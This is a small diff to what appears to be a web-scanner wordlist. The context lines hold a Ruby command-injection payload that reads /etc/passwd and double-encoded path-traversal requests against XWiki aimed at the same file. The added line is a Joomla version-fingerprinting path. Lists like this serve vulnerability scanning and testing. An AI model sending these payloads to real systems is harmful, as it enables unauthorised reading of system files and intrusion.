@@ -896,3 +896,4 @@
 ?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
 /xwiki/bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
 /bin/skin/..%252f/..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/administrator/manifests/files/joomla.xml
